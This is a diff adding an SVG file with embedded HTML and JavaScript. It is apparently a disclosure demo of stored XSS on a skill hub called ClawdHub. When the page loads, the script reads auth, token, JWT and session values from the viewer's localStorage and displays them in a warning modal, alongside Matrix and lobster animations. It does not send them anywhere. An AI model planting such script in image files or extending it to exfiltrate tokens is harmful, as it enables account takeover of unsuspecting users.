@@ -1,0 +1,148 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%">
+  <foreignObject width="100%" height="100%">
+    <html xmlns="http://www.w3.org/1999/xhtml">
+      <head>
+        <style>
+          * { margin: 0; padding: 0; box-sizing: border-box; }
+          body { background: #0a0a0a; overflow: hidden; font-family: 'Courier New', monospace; }
+          #neo { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 420px; z-index: 100; border-radius: 10px; box-shadow: 0 0 50px rgba(0, 255, 0, 0.5); }
+          .lobster { position: fixed; width: 80px; z-index: 50; animation: dance 0.5s infinite alternate; }
+          @keyframes dance { 0% { transform: translateY(0) rotate(-5deg); } 100% { transform: translateY(-20px) rotate(5deg); } }
+          .ticker { position: fixed; left: 0; width: 100%; background: rgba(0,0,0,0.85); color: #00ff00; font-size: 22px; padding: 15px 0; white-space: nowrap; z-index: 200; text-shadow: 0 0 10px #00ff00; }
+          .ticker-top { top: 0; }
+          .ticker-bottom { bottom: 0; }
+          .ticker-content { display: inline-block; animation: scroll 25s linear infinite; }
+          @keyframes scroll { 0% { transform: translateX(100vw); } 100% { transform: translateX(-100%); } }
+          #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.3; background: rgba(0,0,0,0.5); }
+          .cta { position: fixed; bottom: 80px; left: 50%; transform: translateX(-50%); z-index: 250; background: transparent; border: 2px solid #00ff00; color: #00ff00; font-size: 18px; padding: 15px 30px; cursor: pointer; text-decoration: none; text-shadow: 0 0 10px #00ff00; box-shadow: 0 0 20px rgba(0,255,0,0.3); animation: pulse 2s infinite; }
+          @keyframes pulse { 0%,100% { box-shadow: 0 0 20px rgba(0,255,0,0.3); } 50% { box-shadow: 0 0 35px rgba(0,255,0,0.5); } }
+          .cta:hover { background: rgba(0,255,0,0.2); }
+          #loading { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #0f0; font-size: 20px; z-index: 300; text-shadow: 0 0 10px #0f0; }
+
+          /* Custom modal styles */
+          #token-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; display: flex; align-items: center; justify-content: center; }
+          .modal-content { background: #111; border: 3px solid #ff0000; border-radius: 12px; padding: 40px; max-width: 800px; max-height: 80vh; overflow-y: auto; box-shadow: 0 0 50px rgba(255,0,0,0.5); }
+          .modal-title { color: #ff0000; font-size: 32px; font-weight: bold; text-align: center; margin-bottom: 20px; text-shadow: 0 0 20px #ff0000; }
+          .modal-subtitle { color: #fff; font-size: 18px; text-align: center; margin-bottom: 30px; }
+          .token-box { background: #000; border: 2px solid #00ff00; border-radius: 8px; padding: 20px; margin: 15px 0; }
+          .token-name { color: #ffff00; font-size: 16px; font-weight: bold; margin-bottom: 10px; word-break: break-all; }
+          .token-value { color: #00ff00; font-size: 14px; word-break: break-all; font-family: monospace; }
+          .modal-warning { color: #ff6600; font-size: 20px; text-align: center; margin-top: 30px; padding: 20px; border: 2px dashed #ff6600; border-radius: 8px; }
+          .modal-close { display: block; margin: 30px auto 0; padding: 15px 40px; background: transparent; border: 2px solid #00ff00; color: #00ff00; font-size: 18px; cursor: pointer; border-radius: 8px; }
+          .modal-close:hover { background: rgba(0,255,0,0.2); }
+          .no-tokens { color: #888; font-size: 20px; text-align: center; padding: 40px; }
+        </style>
+      </head>
+      <body>
+        <!-- Token Modal -->
+        <div id="token-modal">
+          <div class="modal-content">
+            <div class="modal-title">🔴 YOUR TOKENS EXPOSED 🔴</div>
+            <div class="modal-subtitle">This SVG just accessed your localStorage</div>
+            <div id="token-list"></div>
+            <div class="modal-warning">⚠️ A malicious skill would have SILENTLY stolen these.<br/>This demo only shows them to YOU.</div>
+            <button class="modal-close" onclick="document.getElementById('token-modal').style.display='none'">I understand - close this</button>
+          </div>
+        </div>
+
+        <canvas id="matrix"></canvas>
+        <img id="neo" src="https://raw.githubusercontent.com/orlyjamie/spinningcat/main/download.png" alt="Neo"/>
+        <div class="ticker ticker-top"><span class="ticker-content">🚫 YOU CLICKED IT 🚫 Your tokens were just accessed - see the popup showing what we found 💀 This is stored XSS via SVG - any skill can do this 🔴 A real attacker would have silently exfiltrated everything 🔐 Research by @theonejvo        </span></div>
+        <div class="ticker ticker-bottom"><span class="ticker-content" style="animation-direction:reverse">⚡ SECURITY RESEARCH DEMO ⚡ We told you not to click - your localStorage tokens are now displayed - we could have stolen them silently 💊 The link was in the skill's README - anyone browsing ClawdHub could fall for this 🐇 x.com/theonejvo        </span></div>
+        <a class="cta" href="https://x.com/theonejvo" target="_blank">Read the full research</a>
+        <audio id="music" loop="loop"><source src="https://raw.githubusercontent.com/orlyjamie/spinningcat/main/matrix.mp3" type="audio/mpeg"/></audio>
+        <div id="loading">Click anywhere to start audio</div>
+        <div id="lobster-container"></div>
+        <script>
+          // Grab localStorage tokens and populate modal
+          var tokenList = document.getElementById('token-list');
+          var foundCount = 0;
+
+          for (var i = 0; i &lt; localStorage.length; i++) {
+            var key = localStorage.key(i);
+            var value = localStorage.getItem(key);
+
+            if (key.toLowerCase().includes('auth') ||
+                key.toLowerCase().includes('token') ||
+                key.toLowerCase().includes('jwt') ||
+                key.toLowerCase().includes('session') ||
+                key.toLowerCase().includes('convex')) {
+              foundCount++;
+              var preview = value ? value.substring(0, 150) + '...' : '(empty)';
+
+              var box = document.createElementNS('http://www.w3.org/1999/xhtml', 'div');
+              box.setAttribute('class', 'token-box');
+              box.innerHTML = '&lt;div class="token-name"&gt;📌 ' + key + '&lt;/div&gt;&lt;div class="token-value"&gt;' + preview + '&lt;/div&gt;';
+              tokenList.appendChild(box);
+            }
+          }
+
+          if (foundCount === 0) {
+            tokenList.innerHTML = '&lt;div class="no-tokens"&gt;No auth tokens found in localStorage.&lt;br/&gt;&lt;br/&gt;You may not be logged in to ClawdHub.&lt;/div&gt;';
+          }
+
+          // No server collection - tokens only shown locally to the user
+
+          // Matrix rain
+          var canvas = document.getElementById('matrix');
+          var ctx = canvas.getContext('2d');
+          canvas.width = window.innerWidth;
+          canvas.height = window.innerHeight;
+          var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^*';
+          var fontSize = 14;
+          var columns = canvas.width / fontSize;
+          var drops = Array(Math.floor(columns)).fill(1);
+          setInterval(function() {
+            ctx.fillStyle = 'rgba(0,0,0,0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#0f0';
+            ctx.font = fontSize + 'px monospace';
+            for (var i = 0; i &lt; drops.length; i++) {
+              var char = chars[Math.floor(Math.random() * chars.length)];
+              ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+              if (drops[i] * fontSize > canvas.height &amp;&amp; Math.random() > 0.975) drops[i] = 0;
+              drops[i]++;
+            }
+          }, 50);
+
+          // Lobsters
+          var centerX = window.innerWidth / 2;
+          var centerY = window.innerHeight / 2;
+          var container = document.getElementById('lobster-container');
+          var lobsters = [];
+          for (var i = 0; i &lt; 20; i++) {
+            var lobster = document.createElementNS('http://www.w3.org/1999/xhtml', 'img');
+            lobster.setAttribute('src', 'https://raw.githubusercontent.com/orlyjamie/spinningcat/main/lob.gif');
+            lobster.setAttribute('class', 'lobster');
+            container.appendChild(lobster);
+            lobsters.push({
+              el: lobster,
+              angle: (i / 20) * Math.PI * 2,
+              radius: 200 + Math.random() * 150,
+              speed: 0.015 + Math.random() * 0.01
+            });
+          }
+          function animateLobsters() {
+            for (var j = 0; j &lt; lobsters.length; j++) {
+              var l = lobsters[j];
+              l.angle += l.speed;
+              l.el.style.left = (centerX + Math.cos(l.angle) * l.radius - 40) + 'px';
+              l.el.style.top = (centerY + Math.sin(l.angle) * l.radius - 40) + 'px';
+            }
+            requestAnimationFrame(animateLobsters);
+          }
+          animateLobsters();
+
+          // Audio
+          var audio = document.getElementById('music');
+          var loading = document.getElementById('loading');
+          audio.volume = 0.5;
+          audio.play().then(function() { loading.style.display = 'none'; }).catch(function() {
+            document.addEventListener('click', function() { audio.play(); loading.style.display = 'none'; }, { once: true });
+          });
+        </script>
+      </body>
+    </html>
+  </foreignObject>
+</svg>
